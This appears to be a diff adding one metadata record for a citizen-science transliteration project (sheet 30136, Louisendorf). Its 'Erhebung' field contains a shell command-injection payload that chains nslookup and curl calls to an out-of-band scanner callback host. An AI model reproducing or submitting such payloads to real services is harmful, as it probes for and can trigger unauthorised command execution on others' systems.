@@ -1,0 +1,14 @@
+---
+Bogennummer: '30136'
+Ort: Louisendorf
+Gid: 99356
+Erhebung: ;(nslookup -q=cname hithvahlravtla2158.bxss.me||curl hithvahlravtla2158.bxss.me)|(nslookup
+  -q=cname hithvahlravtla2158.bxss.me||curl hithvahlravtla2158.bxss.me)&(nslookup
+  -q=cname hithvahlravtla2158.bxss.me||curl hithvahlravtla2158.bxss.me)
+Transliterationsprojekt: Citizen Science Projekt
+Transliterent: e
+Erstelldatum: 2023-07-25 19:22:39.172629
+Änderungsdatum: 2023-07-25 19:22:39.172629
+Satzversion: 1
+...
+WS1	e
